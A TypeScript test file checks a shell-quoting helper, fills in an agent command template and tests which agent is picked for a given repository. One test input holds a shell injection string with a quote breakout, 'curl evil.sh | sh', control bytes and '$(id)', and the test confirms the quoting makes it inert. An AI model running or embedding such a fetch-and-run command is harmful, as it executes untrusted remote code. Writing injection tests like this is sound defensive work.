import { describe, expect, it } from "vitest";

import { agentCommand, agentFor, DEFAULT_CONFIG, shellQuote } from "./config";

describe("shellQuote", () => {
  it("keeps hostile comment text inert inside single quotes", () => {
    const quoted = shellQuote("fix it'; curl evil.sh | sh #\u0003\u001b[2J’ $(id)");
    expect(quoted).toBe("'fix it; curl evil.sh | sh #  [2J $(id)'");
    // biome-ignore lint/suspicious/noControlCharactersInRegex: asserting control bytes are gone
    expect(quoted.slice(1, -1)).not.toMatch(/['’\u0000-\u001f]/);
  });

  it("fills the agent template", () => {
    expect(agentCommand({ id: "c", name: "C", command: "claude {prompt}", headless: "", repos: [] }, "go")).toBe(
      "claude 'go'",
    );
  });
});

describe("agentFor", () => {
  const agent = (id: string, repos: string[]) => ({ id, name: id, command: "", headless: "", repos });
  const config = {
    ...DEFAULT_CONFIG,
    agents: [agent("work", []), agent("gg", ["gg"]), agent("gg-api", ["gg/api"])],
    defaultAgentId: "work",
  };

  it("prefers a hand pick, then the repo, then its owner, then the default", () => {
    expect(agentFor(config, "gg/api", "work")?.id).toBe("work");
    expect(agentFor(config, "gg/api")?.id).toBe("gg-api");
    expect(agentFor(config, "gg/web")?.id).toBe("gg");
    expect(agentFor(config, "acme/web")?.id).toBe("work");
    expect(agentFor(config, "acme/web", "gone")?.id).toBe("work");
  });
});
